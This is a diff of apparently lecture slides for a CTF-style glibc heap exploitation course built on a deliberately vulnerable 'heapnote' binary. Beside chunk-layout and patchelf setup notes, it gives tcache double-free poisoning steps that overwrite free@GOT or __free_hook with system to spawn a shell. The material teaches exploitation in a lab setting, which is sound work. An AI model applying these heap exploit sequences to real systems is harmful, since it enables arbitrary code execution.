@@ -108,14 +108,31 @@ One `heapnote` program (Add / Delete / Edit / Show). **One bug**:
 
 ## A malloc chunk (x86-64, glibc)
 
+**In use:**
 ```
       prev_size (8)   <- reused as data of the PREVIOUS chunk when it's in use
       size      (8)   <- chunk size | flags (A|M|P in the low 3 bits)
       user data  ...  <- what malloc() returns (chunk + 0x10)
 ```
+**Freed — the user-data area is reused as the allocator's linked-list
+pointers** (offsets from chunk start; from malloc's returned ptr, subtract
+0x10):
+```
+      +0x10  fd              <- every freed chunk: next chunk in this bin
+      +0x18  bk              <- unsorted / small / large: prev chunk (or &main_arena.bins[i])
+      +0x20  fd_nextsize     <- large bin only: next chunk of a DIFFERENT (larger) size
+      +0x28  bk_nextsize     <- large bin only: prev chunk of a different size
+```
+- tcache & fastbin use only `fd` (singly-linked). unsorted & small bins use
+  `fd`+`bk`. **large bins** (chunk ≥ 0x400) add `fd_nextsize`/`bk_nextsize`
+  to skip across different sizes without walking every chunk in the bin.
 - `malloc(n)` returns `chunk + 0x10`; the 0x10 header is `prev_size` + `size`.
-- Minimum chunk size 0x20; alignment 0x10. Sizes are rounded up.
+- Minimum chunk size **0x20** — exactly `prev_size`+`size`+`fd`+`bk`; that's
+  *why* 0x20 is the floor (a freed chunk must hold fd+bk). Alignment 0x10.
 - Flags: **P** = previous chunk in use, **M** = mmap'd, **A** = non-main arena.
+- **This reuse is the whole game:** read/write a freed chunk's user data =
+  read/write the allocator's list pointers (`fd`/`bk`). Every exploit in this
+  course is some flavor of corrupting these pointers.
 
 ---
 
@@ -246,10 +263,9 @@ tcachebins           # tcache bins only (-v includes empty)
 
 These are fetched as **signed `.deb` packages straight from the Ubuntu archive**
 (no third-party repo, no scripts): `setup.sh` downloads them with `curl` and
-extracts with `dpkg -x` — exactly what `apt download` does. It also fetches the
-**matching `libc6-dbg`** for each build (→ `dbg-2.27/`, `dbg-2.35/`), so pwndbg
-can resolve `main_arena` / `heap` from real symbols instead of heuristics —
-see the next page.
+extracts with `dpkg -x` — exactly what `apt download` does. The shipped libcs
+are stripped (no `libc6-dbg` fetched) — pwndbg resolves `heap` / `tcache` /
+`bins` via its built-in heuristics, which is enough for the live demos.
 
 > **Switching libc is itself a teaching moment.** C1–C3 vs C4 differ only in
 > which pinned libc the binary is bound to. The same `heapnote.c` source becomes
@@ -257,102 +273,38 @@ see the next page.
 
 ---
 
-## Switching libc = two independent steps (the mental model)
+## Switching libc: patchelf vs re-link (not demoed — see Makefile / setup.sh)
 
-A binary's relationship to libc lives on **two layers**, decided at different
-times by different tools. Most "just patchelf it" confusion comes from
-conflating them.
+A binary's libc relationship has two layers; **patchelf only touches one**:
 
-| Layer | What it decides | Where it lives | Who sets it |
-|---|---|---|---|
-| ① **runtime binding** | which `ld.so` + `libc.so.6` actually loads | `.interp` + `DT_RUNPATH` | **patchelf** (or `-Wl,--dynamic-linker`/`-rpath` at link time) |
-| ② **link-time requirements** | which `GLIBC_x.y` symbol versions the binary *declares it needs* | `.gnu.version_r` | the `crt1.o` the linker pulls in — baked in, read-only afterward |
+| Layer | What it decides | Who sets it |
+|---|---|---|
+| ① **runtime binding** — which `ld.so` + `libc.so.6` loads | `.interp` + `DT_RUNPATH` | **patchelf** |
+| ② **link-time requirements** — which `GLIBC_x.y` versions the binary needs | `.gnu.version_r` (read-only after link) | the `crt1.o` at link time |
 
-patchelf only touches ①. It can **lower** ② never. So:
-
-- **patchelf is enough** ⇔ the binary's required versions ≤ what the target
-  libc provides (e.g. it was built on an equal-or-older glibc).
-- **you must re-link with the target's `crt1.o`** ⇔ the binary was linked by a
-  *newer* crt than your target. The classic trap: glibc 2.34 changed
-  `__libc_start_main` to `@@GLIBC_2.34`, so a binary linked on a 2.34+ host
-  requires `GLIBC_2.34` even if it only calls `printf`. Point that at a 2.27
-  libc and the 2.27 loader prints `version GLIBC_2.34 not found` and dies —
-  no amount of patchelf removes that, it's read-only in the binary. (`readelf
-  -V ./heapnote | grep GLIBC` shows this table directly.)
-
-That's exactly why this course links `heapnote` against a **2.27 sysroot**
-(step ②, dropping the requirement to `GLIBC_2.2.5`) **and** pins the
-interpreter+rpath to `glibc-2.27/` (step ①). The Docker setup got away with
-patchelf alone only because the container's gcc *was* the 2.27 toolchain, so
-step ② was already satisfied.
-
----
-
-## Building against the pinned 2.27 (the subtle part)
-
-On a 2.35 host, a plain `gcc heapnote.c` links the **host's `crt1.o`**, which
-requires `__libc_start_main@@GLIBC_2.34` — a version the 2.27 libc doesn't
-have, so the binary segfaults under 2.27 (layer ② from the previous page).
-
-Fix: link against a **2.27 sysroot** so the binary's startup only needs
-`GLIBC_2.2.5`. The 2.35 target needs no sysroot — the host's crt already
-matches 2.35, so a plain compile + patchelf suffices. Exact flags live in the
-Makefile; `setup.sh` builds the sysroot from the `libc6` / `libc6-dev` debs.
-
----
-
-## One-time setup + build
+- **patchelf alone is enough** ⇔ the binary's required versions ≤ the target
+  libc's (built on an equal-or-older glibc).
+- **must re-link against the target's `crt1.o`** otherwise. Trap: a 2.34+-host
+  `crt1.o` requires `__libc_start_main@@GLIBC_2.34`, so a plain `gcc` binary
+  dies under 2.27 (`version GLIBC_2.34 not found`) — patchelf can't remove a
+  requirement, it's baked into the binary. That's why `heapnote` is linked
+  against a **2.27 sysroot** (`setup.sh` builds it) → needs only `GLIBC_2.2.5`,
+  then patchelf pins the interpreter+rpath to `glibc-2.27/`. (`readelf -V
+  ./heapnote | grep GLIBC` confirms no `GLIBC_2.34`.)
+- **Daily CTF patchelf recipe:**
+  `patchelf --set-interpreter ./glibc-2.27/ld-2.27.so --set-rpath ./glibc-2.27 ./bin`.
+  **Gotcha:** the rpath dir needs a `libc.so.6` symlink → the real `libc-X.so`,
+  or the loader silently falls back to your host libc (2.27-ld + 2.35-libc
+  Frankenstein → crash). `setup.sh` makes the symlink.
 
 ```bash
 cd challenges
-make setup     # fetch .debs -> glibc-2.27/ glibc-2.35/ sysroot-2.27/ dbg-2.27/ dbg-2.35/
+make setup     # fetch .debs -> glibc-2.27/ glibc-2.35/ sysroot-2.27/
 make all       # -> heapnote (2.27) + heapnote_235 (2.35)
 ```
 
-Sanity check: `./glibc-2.27/ld-2.27.so --list ./heapnote` should resolve
-`libc.so.6` to `./glibc-2.27/`, and `readelf -V ./heapnote | grep GLIBC`
-should show only `GLIBC_2.2.x` (no `GLIBC_2.34`).
-
----
-
-## pwndbg: resolving heap symbols (debug symbols)
-
-The pinned libcs are **stripped**, so pwndbg's `heap` / `main_arena` won't
-resolve from symbols alone (you'd get `Fail to resolve the symbol: main_arena`).
-`setup.sh` also fetches the matching `libc6-dbg` and extracts it to
-`dbg-2.27/` / `dbg-2.35/`. Point gdb at it:
-
-```javascript
-pwndbg> set debug-file-directory dbg-2.27/usr/lib/debug
-pwndbg> set resolve-heap-via-heuristic force   # tcache is a TLS var; auto-resolve fails
-pwndbg> run            # restart so the libc's .debug attaches at load
-pwndbg> heap           # main_arena resolves — break AFTER the first malloc
-pwndbg> tcache         # needs the heuristic line above; without it: "unknown error"
-```
-
-(For C4 use `dbg-2.35/usr/lib/debug`.) `heap` resolves `main_arena` (a regular
-global) from the debug symbols alone, but `tcache` is a glibc `__thread`
-TLS variable — pwndbg's auto-resolution can't read it, so the `force` line is
-required. No debug symbols on a random CTF libc? `main_arena` lives at
-`&__malloc_hook + 0x10` on 2.27; `__malloc_hook` is an exported dynsym, so you
-can compute the address by hand as a fallback.
-
----
-
-## Patching a binary to a specific libc (the daily CTF workflow)
-
-The general recipe (layer ① from two pages up):
-
-1. Get the matching `libc.so.6` + `ld-linux...so.2` (fetch the `.deb`, or grab
-   them off the remote server's `/lib`).
-2. `patchelf --set-interpreter ./glibc-2.27/ld-2.27.so --set-rpath ./glibc-2.27 ./heapnote` to bind it.
-3. **Gotcha:** the rpath dir must contain a `libc.so.6` symlink → the real
-   `libc-X.so`, or the loader silently falls back to your *host* libc (a
-   2.27-ld + 2.35-libc Frankenstein that crashes). `setup.sh` makes it for you.
-
-Only layer ①. If the binary also requires a newer `GLIBC_x.y` than the target
-has (layer ②), patchelf alone won't save you — re-link against the target's
-crt as above.
+Not demoed live — the instructor runs `make setup && make all` once beforehand.
+Read `setup.sh` / the Makefile for the exact sysroot + patchelf flags.
 
 ---
 
@@ -383,7 +335,6 @@ is a hand-stripped, commented version of the matching how2heap technique.
 checksec ./heapnote                       # confirm: No PIE, Partial RELRO
 ./glibc-2.27/ld-2.27.so --list ./heapnote # libc.so.6 => ./glibc-2.27/...
 file  ./heapnote                          # x86-64, dynamically linked
-# pwndbg:  set debug-file-directory dbg-2.27/usr/lib/debug   # so `heap` resolves
 python3 c1_double_free/exp.py              # expect: shell, then `cat flag.txt`
 ```
 
@@ -464,7 +415,7 @@ $ cat flag.txt
 ## pwndbg view (what to show on screen)
 
 ```
-pwndbg> tcache          # before: 0x20 bin has counts=2, A->A self-loop
+pwndbg> tcache          # before: 0x30 bin has counts=2, A->A self-loop
 pwndbg> tcache          # after malloc #1: A-> &free@GOT
 pwndbg> got             # after malloc #3: free -> win
 ```
@@ -519,15 +470,19 @@ sub-version differences.
 
 ---
 
-## Step 3 — tcache poisoning (UAF-Edit vector)
+## Step 3 — tcache poisoning (reuse C1's double-free + 3-malloc)
 
-We need `counts >= 2` to pop victim-then-target:
+Same primitive as C1 — only the target changes (`free@GOT` → `__free_hook`).
+No `edit` needed; this is pure double-free + 3-malloc, exactly like C1:
 ```
-add(2,0x68); add(3,0x68); del(2); del(3)   # counts=2, head=3->2
-edit(3, 8, p64(__free_hook))              # UAF: head's fd -> __free_hook
-add(4,0x68,"PAD")                         # malloc #1 = chunk-3
-add(5,0x68, p64(system))                  # malloc #2 = __free_hook, write system
+add(2,0x68,"X"); del(2); del(2)          # double-free: 0x70 bin A->A, counts=2
+add(3,0x68, p64(__free_hook))            # malloc #1 = A; write __free_hook into A->fd
+add(4,0x68,"DUMMY")                      # malloc #2 = A again (drain self-loop); head=__free_hook
+add(5,0x68, p64(system))                 # malloc #3 = __free_hook; write system
 ```
+After malloc #3 pops `__free_hook`, `entries = *(__free_hook) = 0` → the 0x70
+bin is left EMPTY, so the next `/bin/sh` malloc comes fresh from top (no
+poisoned-bin crash) — Step 4 is unaffected.
 
 ---
 
